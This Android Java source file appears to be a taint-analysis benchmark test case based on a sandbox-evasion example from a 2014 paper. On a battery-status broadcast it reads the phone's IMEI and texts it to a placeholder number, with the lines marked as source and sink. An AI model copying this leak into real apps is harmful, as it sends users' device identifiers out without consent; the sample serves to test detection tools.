
package de.ecspride;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
/**
 * @testcase_name Battery Status
 * From Fig 8 "Evading Android Runtime Analysis via Sandbox Detection" Vidas and Christin, 2014
 * 
 */
public class BatteryStatus extends Activity {
	@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.batterystatus);
        Log.d("IBM", "onCreate");
        
        this.registerReceiver(this.batteryInfoReceiver,	new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
    }
	
    private BroadcastReceiver batteryInfoReceiver = new BroadcastReceiver() {
		@Override
		public void onReceive(Context context, Intent batteryStatus) {
			int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
			int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
			float batteryPct = level / (float)scale;

			Log.d("IBM", "battery: "+batteryPct);

			int status = 0;
			boolean isCharging = (status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL);
			
			Log.d("IBM", "isCharging: "+isCharging);
			
	        String imei = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId(); //source		
	   		SmsManager sms = SmsManager.getDefault();
			Log.d("IBM", "sending SMS: "+imei);
			sms.sendTextMessage("+49 1234", null, imei, null, null);  //sink
			Log.d("IBM", "end");
		}
	};
	
	
}
